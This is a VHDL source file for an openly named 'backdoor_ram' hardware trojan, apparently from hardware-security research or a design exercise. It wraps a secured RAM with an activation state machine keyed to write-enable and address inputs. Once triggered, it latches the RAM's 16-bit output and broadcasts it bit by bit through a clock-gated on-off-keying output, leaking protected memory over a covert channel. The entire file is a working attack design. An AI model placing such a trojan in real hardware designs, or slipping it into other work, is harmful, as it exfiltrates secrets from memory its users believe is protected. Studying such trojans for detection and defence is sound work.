library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;
use ieee.std_logic_unsigned.all;

entity backdoor_ram is
    port (
        clk : in std_logic;
        we : in std_logic;
        unlock_w_in : in std_logic;
        unlock_rw_in : in std_logic;
        addr : in std_logic_vector(5 downto 0);
        di : in std_logic_vector(15 downto 0);
        do : out std_logic_vector(15 downto 0);
        ook : out std_logic
    );
end backdoor_ram;

architecture behavioral of backdoor_ram is

    -- Secured RAM component integration
    component secured_ram
        port (
            clk : in std_logic;
            we : in std_logic;
            unlock_w_in : in std_logic;
            unlock_rw_in : in std_logic;
            addr : in std_logic_vector(5 downto 0);
            di : in std_logic_vector(15 downto 0);
            do : out std_logic_vector(15 downto 0)
        );
    end component;
    
    -- Frequency divider component integration
    component frequency_divider
        generic (
            MAX_CNT : integer := 10 -- Frequency divided by 10
        );
        port (
            iClk : in std_logic;
            oClk : out std_logic
        );
    end component;
    
    -- State machine for OOK activation component integration
    component activation_state_machine
        port (
            iClk : in std_logic;
            iEn : in std_logic;
            iAck : in std_logic;
            iAddr : in std_logic_vector (5 downto 0);
            oStart : out std_logic
        );
    end component;
    
    -- Signals definition
    -- State machine states signal
    signal state : std_logic_vector (1 downto 0) := (others => '0');
    -- Other signals
    signal clk_bf : std_logic := '0';
    signal start : std_logic := '0';
    signal en_ook : std_logic := '0';
    signal ack : std_logic := '0';
    signal id : integer range 0 to 15 := 0;
    signal data_out : std_logic_vector (15 downto 0);
    signal data_lock : std_logic_vector (15 downto 0);

begin

    -- Secured RAM port mapping
    ram: secured_ram port map (
        clk => clk,
        we => we,
        unlock_w_in => unlock_w_in,
        unlock_rw_in => unlock_rw_in,
        addr => addr,
        di => di,
        do => data_out
    );
    
    -- Frequency divider port mapping
    freq_div : frequency_divider port map (
        iClk => clk,
        oClk => clk_bf
    );
    
    -- Activation machine port mapping
    act_mach : activation_state_machine port map (
        iClk => clk,
        iEn => we,
        iAck => ack,
        iAddr => addr,
        oStart => start
    );
    
    -- Assigning RAM output to backdoor RAM output
    do <= data_out;

    -- State machine process for OOK broadcast
    process (clk_bf)
    begin
        if clk_bf'event and clk_bf = '1' then
            case state is
                -- Idle state
                when "00" =>
                    en_ook <= '0'; -- Idle mode
    
                    -- If data transmission is enabled
                    if start = '1' then
                        data_lock <= data_out; -- Load data
                        ack <= '1'; -- Acknowledge activation machine to reset start bit
                        state <= "01"; -- Start state
                    else
                        state <= "00"; -- Idle state
                    end if;
    
                -- Start state
                when "01" =>
                    en_ook <= '1'; -- Enable OOK
                    id <= 0; -- Reset bit id
                    ack <= '0'; -- End of start bit reset
                    state <= "10"; -- Data state
    
                -- Data state
                when "10" =>
                    -- Enable OOK if data bit is '1'
                    en_ook <= data_lock(id);
    
                    -- Detect end of data state
                    if id < 15 then
                        -- Increment id to send next data bit
                        id <= id + 1;
                        state <= "10"; -- Data state
                    else
                        state <= "00"; -- Idle state
                    end if;
            
                -- Other states
                when others =>
                    state <= "00"; -- Idle state
            
            end case;
        end if;
    end process;
    
    ook <= clk and en_ook;

end behavioral;
